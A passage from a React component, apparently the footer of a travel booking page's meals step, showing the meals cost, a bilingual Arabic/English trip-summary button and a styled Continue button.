            <div className="text-lg font-bold text-[#004b87]">{fmt(mealsCost)}</div>
            <button onClick={() => setMobileSummaryOpen(true)} className="text-sm text-blue-600 font-medium underline">{isAr ? 'ملخص الرحلة' : 'Trip summary'}</button>
          </div>
          <button
            onClick={handleContinue}
            className="bg-[#004b87] hover:bg-[#003b6a] text-white font-medium px-8 py-3 rounded-full transition-colors"
          >
            {t('common.continue')}
          </button>
        </div>
      </div>
    </div>
  );
}
